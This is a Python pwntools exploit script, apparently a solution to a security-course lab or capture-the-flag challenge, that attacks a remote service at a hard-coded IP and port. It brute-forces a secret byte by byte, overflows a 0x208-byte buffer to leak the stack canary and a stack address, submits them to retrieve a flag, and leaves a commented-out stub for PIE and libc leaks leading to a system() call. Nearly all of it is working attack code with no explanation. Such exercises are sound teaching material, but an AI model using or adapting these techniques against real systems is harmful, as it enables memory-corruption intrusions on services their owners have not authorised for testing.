from pwn import *
io = remote('140.114.77.172', 10002)
#io = process('leak')

def asksecret(data):
    io.recvuntil('>')
    io.sendline('1')
    io.recvuntil('Try: ')
    #raw_input('compare secret')
    io.send(data)

def grill(yn, note):
    io.recvuntil(']\n')
    io.send(yn)
    if yn == 'y':
        io.recvuntil('Note: ')
        #raw_input('canary and stack')
        io.send(note)

def leavemessage(index, level, data):
    io.recvuntil('>')
    io.sendline('3')
    io.recvuntil('Index: ')
    io.sendline(str(index))
    io.recvuntil('>')
    io.sendline(str(level))
    io.recvuntil('Message: ')
    #raw_input('check ListMessage')
    io.send(data)

def showmessage(index):
    io.recvuntil('>')
    io.sendline('4')
    io.recvuntil('Index: ')
    #raw_input('check address of return address in stack')
    io.sendline(str(index))


def lab(stack, secret, canary):
    io.recvuntil('>')
    io.sendline('5')
    io.recvuntil('>')
    #raw_input('check stack answer')
    io.sendline('1')
    io.recvuntil('Stack: ')
    io.send(p64(stack))
    io.recvuntil('Secret: ')
    io.send(p64(secret))
    io.recvuntil('Canary: ')
    io.send(p64(canary))

def hw(stack, pie, libc, secret, canary):
    io.recvuntil('>')
    io.sendline('5')
    io.recvuntil('>')
    io.sendline('2')
    io.recvuntil('answer: ')
    #raw_input('check libc answer')
    io.send(p64(stack) + p64(pie) + p64(libc) + p64(secret) + p64(canary))


#leak secret
secret = ""
while(len(secret) < 8):
	for i in range(0x00,0xff):
		payload = 'A'*8 + secret + chr(i)
		asksecret(payload)
		r = io.recvuntil('\n')
		if "wrong" not in r:
			secret += chr(i)
			break
	print(secret.encode('hex'))
secret = u64(secret)
print("Secret: " + hex(secret) + '\n')

#leak canary and stack
#notice: be careful to put these two lines before you enter grill() like :
io.recvuntil('>') # enter grill
io.sendline('2')

grill('y', 'A'*0x208 + 'B')
#you can receive message of printf at here
io.recvuntil("2019\n")
io.recvuntil("B")
rec = io.recvline(keepends=False)
print(rec.encode('hex'))

rec = chr(0) + rec
canary = rec[0:8]
canary = u64(canary)

stack = rec[8:] + "\x00\x00"
stack = u64(stack)
stack = stack - 0x70
print("Canary: " + hex(canary))
print("Stack: " + hex(stack) + "\n")

io.recvuntil(']\n')
io.send('y')

grill('y', 'A'*0x208 + chr(0))
io.recvuntil(']\n')
io.send('n') # leave grill

#lab check

lab(stack, secret, canary)

io.recvuntil('Here you go!\n')
flag1 = io.recvuntil('}')
print(flag1)
'''

#leak PIE

#leak libc


hw(stack, ListMessage, system_libc, secret, canary)
io.interactive()
'''



